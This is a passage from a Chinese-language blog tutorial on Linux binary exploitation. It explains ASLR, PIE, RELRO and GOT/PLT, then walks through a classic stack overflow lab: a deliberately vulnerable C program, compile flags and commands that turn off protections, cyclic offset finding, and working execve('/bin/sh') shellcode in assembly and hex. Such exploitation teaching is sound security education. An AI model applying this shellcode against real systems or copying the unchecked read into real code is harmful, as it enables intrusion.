0x7ffcd375c374</span><br><span class="line">libc: 0x7f51c11fb500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>的地址和<strong>libc</strong>的地址发生了改变</p><h6 id="完全开启时"><a href="#完全开启时" class="headerlink" title="完全开启时"></a>完全开启时</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x15162a0</span><br><span class="line">stack: 0x7ffda4f34384</span><br><span class="line">libc: 0x7f615589b500</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x5a22a0</span><br><span class="line">stack: 0x7ffe432fa664</span><br><span class="line">libc: 0x7f17a059f500</span><br></pre></td></tr></table></figure><p>可以看到只有<strong>栈</strong>、<strong>libc</strong>、<strong>堆</strong>的地址发生了改变，但是程序本身的<strong>PLT</strong>不变</p><h5 id="开启ALSR和PIE"><a href="#开启ALSR和PIE" class="headerlink" title="开启ALSR和PIE"></a>开启ALSR和PIE</h5><p>GCC支持的PIE选项如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fpic          <span class="comment">#为共享库生成位置无关代码</span></span><br><span class="line">-pie           <span class="comment">#生成动态链接的位置无关可执行文件，通常需要同时指定-fpie</span></span><br><span class="line">-no-pie        <span class="comment">#不生成动态链接的位置无关可执行文件</span></span><br><span class="line">-fpie          <span class="comment">#类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie</span></span><br><span class="line">-fno-pie       <span class="comment">#不生成位置无关代码</span></span><br></pre></td></tr></table></figure><p>通过<code>-pie -fpie</code>进行编译，可以看到全部地址都随机了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# gcc -pie -fpie test.c -ldl</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x5640b79d01c9</span><br><span class="line">system@plt: 0x7fa5361ca410</span><br><span class="line">heap: 0x5640b8a392a0</span><br><span class="line">stack: 0x7ffc036cac64</span><br><span class="line">libc: 0x7fa53636d500</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# ./a.out </span><br><span class="line">executable: 0x561760ad81c9</span><br><span class="line">system@plt: 0x7f509abd0410</span><br><span class="line">heap: 0x561760be32a0</span><br><span class="line">stack: 0x7ffe2f8a7694</span><br><span class="line">libc: 0x7f509ad73500</span><br><span class="line">root@ubuntu:/home/ascotbe/Desktop/Pwn# </span><br></pre></td></tr></table></figure><hr><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为”Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c            <span class="comment">#默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c <span class="comment">#关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c    <span class="comment">#部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c     <span class="comment">#全部开启</span></span><br></pre></td></tr></table></figure><hr><blockquote><h3 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h3></blockquote><h4 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h4><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。</p><hr><h4 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h4><p>PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p><h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p><hr><h4 id="GOT和PLT的关系"><a href="#GOT和PLT的关系" class="headerlink" title="GOT和PLT的关系"></a>GOT和PLT的关系</h4><p>ELF使用PLT（Procedure linkage Table, 过程链接表）的方法来实现。通常我们调用某个外部模块的函数时，应该是通过GOT中相应的项进行间接跳转。而PLT为了实现延迟绑定，在这个过程中有增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过一个叫作PLT项的结构来进行跳转。每个外部函数在PLT中都有一个相应的项，比如<code>gets()</code>（在string头文件的函数，不是用户自定义的函数）在PLT中的项的地址我们称为<code>gets@plt</code>。其中<code>gets@plt</code>的实现如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/3.png" alt="image-20201116153715662"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在gets第一次使用的时候，会做以下操作，如果不是第一次就直接jmp *(gets@GOT)就能获取到函数的真实地址</span><br><span class="line">gets@plt:</span><br><span class="line">    jmp *(gets@GOT)</span><br><span class="line">    push n</span><br><span class="line">    jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><ul><li>第一条指令是通过一条GOT间接跳转的指令。jmp指令跳转到GOT表，数据为0x400486</li><li>第二条指令执行<code>push 0x3</code>，这个为在GOT中的下标序号。</li><li>第三条指令<code>jmp 0x400440</code>，这个地址为PLT[0]的地址，PLT[0]的指令会进入动态链接器的入口，执行一个函数（_dl_runtime_resolve）将真正的函数地址填入到GOT表中</li></ul><p>再次调用<code>gets@plt</code>时，第一条jump指令能跳转到真正的gets()函数中，gets()函数返回的时候会根据堆栈里保存的EIP直接返回到调用者，而不会在继续执行<code>gets@plt</code>中第二条指令开始的那段代码。因为GOT表中已经有真正的函数地址，逻辑和下图类似</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/4.png" alt="image-20201116161136273"></p><hr><blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3></blockquote><h4 id="可重定位目标文件-Relocatable-File）"><a href="#可重定位目标文件-Relocatable-File）" class="headerlink" title="可重定位目标文件 (Relocatable File）"></a>可重定位目标文件 (Relocatable File）</h4><p><strong>Linux</strong>下的.o（<strong>Windows</strong>下的.obj）包含代码和数据，可被用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类 </p><p>每个.o 文件由对应的.c文件生成 每个.o文件代码和数据地址都从0开始</p><hr><h4 id="可执行目标文件-Executable-File"><a href="#可执行目标文件-Executable-File" class="headerlink" title="可执行目标文件(Executable File)"></a>可执行目标文件(Executable File)</h4><p>包含的代码和数据可以被直接复制到内存并被执行</p><p><strong>Linux</strong>下的无文件后缀（<strong>Windows</strong>下的.exe）</p><hr><h4 id="共享的目标文件-Shared-Object-File"><a href="#共享的目标文件-Shared-Object-File" class="headerlink" title="共享的目标文件 (Shared Object File)"></a>共享的目标文件 (Shared Object File)</h4><p>链接器可使用.so文件跟其他.o文件和.so文件链接以生成新的.o文件</p><p>动态链接器将几个.so文件与可执行文件结合，作为进程映像的一部分来运行 特殊的可重定位目标文件，能在装入或运行时被装入到内存并自动被链接，称为共享库文件</p><p><strong>Windows</strong> 中称其为 <strong>Dynamic</strong> <strong>Link</strong> <strong>Libraries</strong> (<strong>DLLs</strong>)</p><hr><h4 id="常见的文件格式"><a href="#常见的文件格式" class="headerlink" title="常见的文件格式"></a>常见的文件格式</h4><ul><li><p>DOS操作系统（最简单） ：<strong>COM格式</strong>，文件中仅包含代码和数据，且被加载到固定位置</p></li><li><p>UNIX System V早期版本：<strong>COFF格式</strong>，文件中不仅包含代码和数据，还包含重定位信息、调试信息、符号表等其他信息，由一组严格定义的数据结构序列组成</p></li><li><p>Windows： <strong>PE格式（COFF的变种）</strong>，称为可移植可执行（Portable Executable，简称PE）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/03/23/PortableExecutable/">PE格式详解</a></p></li><li><p>Linux：<strong>ELF格式（COFF的变种）</strong>，称为可执行可链接（Executable and Linkable Format，简称ELF）</p><p>详解请看这篇文章<a href="https://www.ascotbe.com/2020/12/6/ExecutableLinkableFormat/">ELF格式详解</a></p></li></ul><hr><blockquote><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3></blockquote><h4 id="ELF文件生成"><a href="#ELF文件生成" class="headerlink" title="ELF文件生成"></a>ELF文件生成</h4><p>首先来看一个代码文件生成过程，下面过程也可以直接从原始C文件链路到任意过程，一下步骤只是一个拆分过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="预处理过程"><a href="#预处理过程" class="headerlink" title="预处理过程"></a>预处理过程</h5><p>主要处理源文件中以“#”开头的预编译指令，经过预编译处理后，得到的是预处理文件（如，hello.i) ，它还是一个可读的文本文件 。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure><hr><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h5><p>将预处理后得到的预处理文件（如 hello.i）进行词法分析、语法分析、语义分析、优化后，生成汇编代码文件。经过编译后，得到的汇编代码文件（如 hello.s）还是可读的文本文件，CPU无法理解和执行它。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/5.png" alt="image-20201116113805853"></p><hr><h5 id="汇编过程"><a href="#汇编过程" class="headerlink" title="汇编过程"></a>汇编过程</h5><p>汇编程序（汇编器）用来将汇编语言源程序转换为机器指令序列（机器语言程序）。汇编结果是一个可重定位目标文件（如 hello.o），其中包含的是不可读的二进制代码，必须用相应的工具软件来查看其内容。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>预处理、编译和汇编三个过程针对一个模块（一个*.c文件）进行处理，得到对应的一个可重定位目标文件（一个*.o文件）。</p><p>用IDA打开</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/6.png" alt="image-20201116114352893"></p><hr><h5 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h5><p>将多个可重定位目标文件合并以生成可执行目标文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  hello.o -o hello</span><br></pre></td></tr></table></figure><p>用IDA打开编译好可以执行的文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/7.png" alt="image-20201116114653378"></p><hr><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>拿到一个文件后首先第一步就是看保护，通过保护来查看使用什么思路</p><ul><li>RELRO： got表的保护，如果开了的话，无法写got表，没开考虑got表</li><li>Canary: 栈溢出保护，开了的话，想办法利用bypass canary绕过，没开直接ROP</li><li>NX: 开了的话，利用ROP技术绕过，没开的话，考虑执行shellcode</li><li>PIE： 开了的话就用bypass pie技术绕过， 没开的话，地址是固定的，考虑一下是否存在后门函数，查看是否有&#x2F;bin&#x2F;sh以及system函数</li></ul><hr><blockquote><h3 id="快速获取恶意汇编"><a href="#快速获取恶意汇编" class="headerlink" title="快速获取恶意汇编"></a>快速获取恶意汇编</h3></blockquote><p>使用Python中的pwntools包可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    <span class="comment"># push &#x27;/bin///sh\x00&#x27;</span></span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>果需要在64位的Linux上执行<code>/bin/sh</code>就可以使用<code>shellcraft.amd64.linux.sh()</code>，配合asm函数就能够得到最终的payload了。</p><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等</p><blockquote><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3></blockquote><h4 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h4><p>参考这篇文章<a href="https://www.ascotbe.com/2022/02/22/StackOverflow_Linux_0x00/">Linux栈溢出总结（0x00）</a></p><hr><h4 id="无保护溢出"><a href="#无保护溢出" class="headerlink" title="无保护溢出"></a>无保护溢出</h4><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><h5 id="编译代码"><a href="#编译代码" class="headerlink" title="编译代码"></a>编译代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译上述代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie level1.c -o level1 </span><br></pre></td></tr></table></figure><p>接着查看程序保护是否关闭了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># checksec level1</span></span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/level1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>接着关闭Linux系统的ASLR保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非docker容器关闭</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment">#docker容器只能在GDB场景下关闭</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on<span class="comment">#关闭ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off <span class="comment">#开启ASLR</span></span><br><span class="line">show disable-randomization<span class="comment">#查看ASLR状态</span></span><br></pre></td></tr></table></figure><p>如果输入<code>cat /proc/sys/kernel/randomize_va_space</code>若返回为0的话表示已经关闭了</p><ul><li>0 &#x3D; 关闭</li><li>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 &#x3D; 全随机。除了1中所述，还有heap。</li></ul><p>也可以使用ldd通过看加载动态库时动态库的基址来确定是否开启ASLR，如果开启是下面这样的，未开启是值不变的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7ed1000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cd5000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7ed2000)</span><br><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7f8f000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d93000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f90000)</span><br></pre></td></tr></table></figure><p>在没有任何保护的情况下，我们的利用思路只需要确定字符串大小、返回地址、还有shellcode，然后拼接起来即可，拼接的原理有两种方法</p><ul><li>方法1：把shellcode写在函数的栈帧里, 但其大小有限（只需要计算当前栈的栈帧大小合理利用即可</li><li>方法2：把shellcode写在调用者(main)的栈帧里（需要获取到可利用栈的返回地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">方法1：                                             方法2：</span><br><span class="line">     Stack                                             Stack</span><br><span class="line">+------------------+               低地址           +------------------+ </span><br><span class="line">|    shellcode     | &lt;-异栈帧          ^            | &quot;AAAAAAAAAAAAAA&quot; | &lt;-异栈帧 </span><br><span class="line">+------------------+                  |            +------------------+ </span><br><span class="line">| &quot;AAAAAAAAAAAAAA&quot; |                  |            |       ret        |</span><br><span class="line">+------------------+                  |            +------------------+ </span><br><span class="line">|        ret       |                  |            |    shellcode     |&lt;-main函数栈帧</span><br><span class="line">+------------------+                高地址          +------------------+ </span><br><span class="line">|                  | &lt;-main的栈帧                   |                  |</span><br><span class="line">+------------------+                               +------------------+</span><br></pre></td></tr></table></figure><hr><h5 id="找出溢出值"><a href="#找出溢出值" class="headerlink" title="找出溢出值"></a>找出溢出值</h5><p>首先开始确定程序溢出的字符串大小，我们先创建200个字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>运行后程序奔溃，EIP被覆盖了，显示错误值为<code>0x6261616b(kkab)</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/8.png" alt="image-20201117143016927"></p><p>然后我们用cyclic就能看到溢出的字符串大小了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><hr><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>接着制作一个shellcode，直接使用汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; shellcode.asm</span><br><span class="line">; execve (&quot;/bin/sh&quot;) 汇编原形</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax        ;&quot;\x00&quot;</span><br><span class="line">push 0x68732f2f ;&quot;//sh&quot; 入栈</span><br><span class="line">push 0x6e69622f ;&quot;/bin&quot; 入栈</span><br><span class="line">mov ebx, esp    ;ebx=esp &quot;/bin//sh&quot;的地址</span><br><span class="line">push eax        ;&quot;\x00&quot; 入栈</span><br><span class="line">push ebx        ;&quot;/bin//sh&quot;地址入栈</span><br><span class="line">mov ecx, esp    ;ecx=esp  为指针数组地址</span><br><span class="line">xor edx, edx    ;edx=0</span><br><span class="line">mov al, 11      ;al=11   execve的系统调用号</span><br><span class="line">int 0x80        ;软中断指令</span><br></pre></td></tr></table></figure><p>如果不确定汇编能不能用可以编译然后运行试试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellcode.asm</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o <span class="comment">#编译的是32位的汇编</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/9.png" alt="image-20201117203411240"></p><p>接着我们要把汇编代码转换成SHELLCODE，有好几种方法，这边就提三种</p><ul><li><p>使用rasm2把汇编代码转换为C的shellcode，转换的时候只需要shellcode.asm文件<code>_start:</code>后面的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># rasm2 -a x86 -b 32 -f shellcode.asm -C</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>使用pwntools进行转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shellcode.py</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">pwn.context.arch      = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">pwn.context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">pwn.context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">pwn.context.word_size = <span class="number">32</span></span><br><span class="line">shellcode = pwn.asm(<span class="string">&quot;xor eax, eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push ebx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ecx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;xor edx, edx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>运行Python脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># python3 shellcode.py</span></span><br><span class="line">31c050682f2f7368682f62696e89e3505389e131d2b00bcd80</span><br></pre></td></tr></table></figure></li><li><p>使用pwntools内置的汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></table></figure></li></ul><hr><h5 id="寻找返回地址"><a href="#寻找返回地址" class="headerlink" title="寻找返回地址"></a>寻找返回地址</h5><p>由于gdb的调试环境会影响<strong>buf</strong>在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行<code>./level1</code>的时候，<strong>buf</strong>的位置会固定在别的地址上。</p><p>所以需要开启core dump功能，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/core_uses_pid</span><br><span class="line"><span 